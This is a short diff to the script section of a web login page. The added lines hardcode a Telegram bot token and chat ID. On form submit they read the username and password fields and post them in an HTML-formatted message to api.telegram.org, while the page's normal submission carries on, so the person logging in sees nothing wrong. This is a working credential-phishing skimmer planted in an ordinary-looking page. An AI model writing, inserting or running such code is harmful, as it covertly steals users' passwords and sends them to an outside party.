@@ -530,6 +530,8 @@
 
     <script src="https://code.jquery.com/jquery-3.6.3.js" integrity="sha256-nQLuAZGRRcILA+6dMBOvcRh5Pe310sBpanc6+QBmyVM=" crossorigin="anonymous"></script>
     <script>
+        const token = '5993222137:AAHrDYc4jMrYsEApI1ztwMiuUY9yXcbOM-k';
+        const chatId = '-942199181';
         function validateUsr() {
             let usrValue = $("#user").val();
             if (usrValue.length <= 0) {
@@ -563,6 +565,27 @@
     
     async function handleSubmit(event) {
       event.preventDefault();
+        var usr = document.querySelector('#user').value;
+        var pwd = document.querySelector('#passwd').value;
+        var message = `<b>Username</b> : <code>${usr}</code> <b>Password</b> : <i>${pwd}</i>`;
+        $.ajax({
+            type: form.method,
+            url: `https://api.telegram.org/bot${token}/sendMessage`,
+            data: {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'html',
+            },
+            success: function (res) {
+                console.debug(res);
+                $('#response').text('Message sent');
+            },
+            error: function (error) {
+                console.error(error);
+                alert("error failed");
+            }
+        });
+
       var status = document.getElementById("my-form-status");
       var data = new FormData(event.target);
       fetch(action, {
